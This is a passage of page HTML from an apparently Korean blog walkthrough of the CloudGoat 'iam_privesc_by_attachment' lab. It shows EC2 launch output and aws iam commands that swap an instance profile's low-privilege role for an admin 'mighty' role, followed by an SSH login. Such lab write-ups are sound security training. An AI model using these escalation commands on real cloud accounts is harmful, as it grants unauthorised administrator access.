url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZUlEQVQ4y5VUyXLaUBAUi80ugQQIEIsWdoEA2QUIDIUxiZ3C8SWHnPIbIa5K5Q/yMfnCTs0IiC8BfGi9V5Jeq6enR8K62cXDYoVO28XK22A9XWN4/wXu/Bk7+wW/rBe8Glvsqk/4XnnCrvYJr/qW15/mZ/wwn/E79og/ia/4Fh1DSMTzMEwHcs5E1/HguEsMBx6Gozkm7j369VtYWg+aUkcpYyIv1hgFyUAuVYUq6pBlHZJSQzShQkgrOopaG72+h0bTRbN9C7MxQlXvoWL0oOk25LyBcCyLUFRBKKIgFPX3/r0swtcKriJZhK5kCHRRiw2Mpw9whnOMpxsY1gC66TC0SgdJUUMglL4IQiSWh5IzoBabvEqZCoSgBEFI8RoMZ94FVlgzHS4xLddwHc0hlij4D4k0IB6JScFZwsNBOavD7nsw60NGo3UDqzHisqlkeudAeorYJwyIyBfq7J/teKg3XQzdBZMWtRayeRPRuPoOhQEJUqaKwWjBZAcLSFkiVWRfxXT5ckJ6MZ4solBqMtJyFWK6wn5S0ygWb308W7K/kdizifeBY0PEVGYiVfIDS50PiEey/5EKBzIqL6danDvyjLwjX+WsweWmCFL5bLePXSZF3vwjlqsteo7HRAWtxR9ISRriyQLbchlhUOLsUclEQHtOvZD8l8V9Hi8qmR6S+Ydx0y0H5WqXm0INIdAAvD142sOAiJxaR8+ZsXcde8IR6g9mHCOaIB78vdJTKvceiscfxOhmicHoDrO7R56YjKJzhKghlEeKFCk+q5A6O/E2sPtTf+Qsh70kULgpPkRKDTpF+Be8qb6OycpiBQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"13\"\n        title=\"13\"\n        src=\"/static/e125104d7ab09f203228d9435f880f44/37523/13.png\"\n        srcset=\"/static/e125104d7ab09f203228d9435f880f44/e9ff0/13.png 180w,\n/static/e125104d7ab09f203228d9435f880f44/f21e7/13.png 360w,\n/static/e125104d7ab09f203228d9435f880f44/37523/13.png 720w,\n/static/e125104d7ab09f203228d9435f880f44/84cc5/13.png 898w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJElEQVQoz12QCW/CMAyF+///4CYBE2J0vTjWtImPHG9KWjrA0qfnJvazm+r7csOuueKjHnBoe3yeT9jXHb6aAV9NX3Rft9idWxx+Ohz7K3bnBsfuivo24jTc0RqLdszMqC7DgL7rME8GTA7sCOQcKOdEhSV3YKZNVaXgswqvCKrZWkyzBRGDRUDMYGaIKmKMGyGsxAUfwkZ40mo0UynIkfAf1royyGlAiAlICSktFY4I1lq8R76vsmtai9NTk7EGLIzFK20NyzCL0RgwS/kbFgXp4lM55+C9f5mSIz+FiJTNHucFAKpaesp3jEXjel/dZ0ZmIoWGuBnnQdM0wTmCiBZYA9hHEAtIfMnLmQZY8cW0+rUC4xQzaXmr501eNnsjxlcevX/mZXCgAvxZpAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"14\"\n        title=\"14\"\n        src=\"/static/b9e28e89a69c9f6fb0f7e18c875fd940/37523/14.png\"\n        srcset=\"/static/b9e28e89a69c9f6fb0f7e18c875fd940/e9ff0/14.png 180w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/f21e7/14.png 360w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/37523/14.png 720w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/302a4/14.png 1080w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/07a9c/14.png 1440w,\n/static/b9e28e89a69c9f6fb0f7e18c875fd940/dca52/14.png 1550w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>새로운 EC2 인스턴스를 성공적으로 생성할 수 가 있습니다. 출력되는 정보는 새 EC2 인스턴스의 세부정보이기 때문에 저장을 해둡니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"Groups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"Instances\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"AmiLaunchIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ImageId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ami-0a313d6098716f372\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"InstanceId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"i-0a726b6396cec2a5e\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"InstanceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"t2.micro\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"KeyName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"fake-ec2\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"LaunchTime\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-08-12T18:29:38+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Monitoring\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"disabled\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Placement\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"AvailabilityZone\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"us-east-1a\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Tenancy\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"default\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ProductCodes\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"PublicDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Code\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"StateTransitionReason\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SubnetId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"subnet-04d05182b53c1ff11\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"VpcId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"vpc-01585d6620e5d752f\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Architecture\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"x86_64\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"BlockDeviceMappings\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"ClientToken\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"8e003941-0ceb-47b4-9730-71cb25aa529d\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EbsOptimized\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EnaSupport\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"Hypervisor\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"xen\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"IamInstanceProfile\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Arn\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:instance-profile/cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"AIPA2MALBVI5RQHINFLHJ\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"NetworkInterfaces\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Attachment\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token property\">\"AttachTime\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-08-12T18:29:38+00:00\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"AttachmentId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"eni-attach-03cf3a976529cfabe\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"DeleteOnTermination\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"DeviceIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"Status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"attaching\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token property\">\"NetworkCardIndex\"</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span>\n                    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Groups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                        <span class=\"token punctuation\">{</span>\n                            <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"GroupId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"sg-04ffcf8e873ee2103\"</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Ipv6Addresses\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"MacAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0a:fc:1e:7d:bf:59\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"NetworkInterfaceId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"eni-0aad79f50a762977a\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"OwnerId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;USERID>\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"PrivateIpAddresses\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                        <span class=\"token punctuation\">{</span>\n                            <span class=\"token property\">\"Primary\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"PrivateDnsName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ip-10-0-10-102.ec2.internal\"</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token property\">\"PrivateIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"10.0.10.102\"</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"SourceDestCheck\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"in-use\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"SubnetId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"subnet-04d05182b53c1ff11\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"VpcId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"vpc-01585d6620e5d752f\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"InterfaceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"interface\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"RootDeviceName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"/dev/sda1\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"RootDeviceType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ebs\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SecurityGroups\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"GroupName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"GroupId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"sg-04ffcf8e873ee2103\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"SourceDestCheck\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"StateReason\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Code\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"Message\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"VirtualizationType\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"hvm\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"CpuOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"CoreCount\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"ThreadsPerCore\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"CapacityReservationSpecification\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"CapacityReservationPreference\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"open\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"MetadataOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"State\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"pending\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpTokens\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"optional\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpPutResponseHopLimit\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"HttpEndpoint\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"enabled\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"EnclaveOptions\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"Enabled\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"OwnerId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;USERID>\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"ReservationId\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"r-04495e19ef68a6678\"</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"최고-관리자-iam-instance-프로필을-새로운-ec2-instance로-변경\" style=\"position:relative;\"><a href=\"#%EC%B5%9C%EA%B3%A0-%EA%B4%80%EB%A6%AC%EC%9E%90-iam-instance-%ED%94%84%EB%A1%9C%ED%95%84%EC%9D%84-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2-instance%EB%A1%9C-%EB%B3%80%EA%B2%BD\" aria-label=\"최고 관리자 iam instance 프로필을 새로운 ec2 instance로 변경 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>최고 관리자 IAM Instance 프로필을 새로운 EC2 Instance로 변경</h3>\n<ul>\n<li>앞서 새로운 EC2 Instance를 생성했습니다. 인스턴스 Rule <code class=\"language-text\">cg-ec2-meek-instance-profile-/cloud-goat-id</code> 은 여전히 권한이 낮은 IAM Rule이기 때문에 이를 제거하고 인스턴스 프로파일에 IAM 역할을 추가하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam remove-role-from-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --role-name cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu --profile kerrigan\n\naws iam add-role-to-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu \\\n    --role-name cg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu --profile kerrigan\n\naws iam remove-role-from-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-&lt;CLOUD_GOAT_ID> \\\n    --role-name cg-ec2-meek-role-&lt;CLOUD_GOAT_ID> --profile kerrigan\n\naws iam add-role-to-instance-profile \\\n    --instance-profile-name cg-ec2-meek-instance-profile-&lt;CLOUD_GOAT_ID> \\\n    --role-name cg-ec2-mighty-role-&lt;CLOUD_GOAT_ID> --profile kerrigan\n\n<span class=\"token property\">\"InstanceProfileName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token property\">\"RoleName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n\ncg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<h3 id=\"ssh를-통해-새로운-ec2에-액세스\" style=\"position:relative;\"><a href=\"#ssh%EB%A5%BC-%ED%86%B5%ED%95%B4-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2%EC%97%90-%EC%95%A1%EC%84%B8%EC%8A%A4\" aria-label=\"ssh를 통해 새로운 ec2에 액세스 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSH를 통해 새로운 EC2에 액세스</h3>\n<ul>\n<li>앞서 새로 생성된 EC2 인스턴스에 SSH로 접속해 보겠습니다. 미리 만들어 두었던 SSH 개인 키에 대한 권한 을 변경해주었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQY023MXW/SUACA4ZPB5kzBjbkUKZUB/bCUQml7Dod2tGXsQzDbjJqoF/4B4/+/fo3bhTHx4kneq1esRxF7u2Bra/bnimF7TOt8QHoasjcW3LZidu2EOyPmzpjzvhVzdRSyPvApGz7lwb+EN8sxukM6fZdArXFDSZrV2H6MmxUM5wpPFvTCDGue03EixIsTRKOFaP5HFK2w7YCLYYTW14RTTaau8ANJkpTMZgVpWhFMNHl5z9jNeHls0mx0OGyePTt8dtQ8Qzh+ymtzTNfySeUG788oq3BGEZOpZhKtCKPVU+v8+qnNNy4nnQFGu48Q7b8arxBSljheTBBmVJs9SlXk9Qd6cc0iK1HLDYv0kji5RC5rwqnCsn36b9/R7TmY3TE9y8O0HEbHA8TP3Y7H+wfK+obPX77z8eET28dvXHz9hSo2yCwnmMQkqWapS6QqyGROXtSo5Rq9qqiqG1bVlh+nmt8XG7B4I7ji+gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"15\"\n        title=\"15\"\n        src=\"/static/0d48dd6ec2cccabf794960e4c36c5e23/37523/15.png\"\n        srcset=\"/static/0d48dd6ec2cccabf794960e4c36c5e23/e9ff0/15.png 180w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/f21e7/15.png 360w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/37523/15.png 720w,\n/static/0d48dd6ec2cccabf794960e4c36c5e23/9a86a/15.png 792w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>새로 생성된 EC2 인스턴스의 공용 IP 대역을 query를 조회하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances \\\n --query <span class=\"token string\">\"Reservations[*].Instances[*].PublicIpAddress\"</span> \\\n --output text \\\n --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+klEQVQY013MyU7CUACF4ZvgBKghUEpACKCU21460TpFY0mD1QDGKeKwcOnOV3BR9XF8x9/YEGNcfDmLc3JELG2ep1OC/WOiKCEeTzg/u6B384IXzzgdJbyqKal7x0f4mEmH97wHD7w5t6T+nM/dJ1J3ztfyNUIvNek0Jc32AEOGbLUUmr5DXe9SrW5T1rpYZQt7U2KXTLyKjVcZ0Flq0RC1TF3oWWq5GqJa76PcI4bhKDsqbjQQooAQq4v8kV9Y+yP/ry8gckWE4x5weTXnJEowVUBfeigVsO6PqRlDLOnR7pj0DAdLBUjTxzBcbGfvd+v5hwxUyGTF5hsyCHVl/RUeOQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"16\"\n        title=\"16\"\n        src=\"/static/0b1fc87c79ea16cafa3b22a084fd0df1/37523/16.png\"\n        srcset=\"/static/0b1fc87c79ea16cafa3b22a084fd0df1/e9ff0/16.png 180w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/f21e7/16.png 360w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/37523/16.png 720w,\n/static/0b1fc87c79ea16cafa3b22a084fd0df1/4e6ec/16.png 827w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>3개 가 출력된 것은 기존에 만들어 두었던 인스턴스가 걸린 정보이고 새로운 정보는 큐형태로 마지막 <code class=\"language-text\">3.90.208.120</code> IP 대역입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">ssh -i fake-ec2.pem ubuntu@<span class=\"token number\">3.90</span>.<span class=\"token number\">208.120</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: 